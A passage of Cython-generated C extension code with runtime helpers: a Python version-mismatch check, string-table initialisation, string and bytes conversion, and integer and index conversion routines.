    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}


static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif 
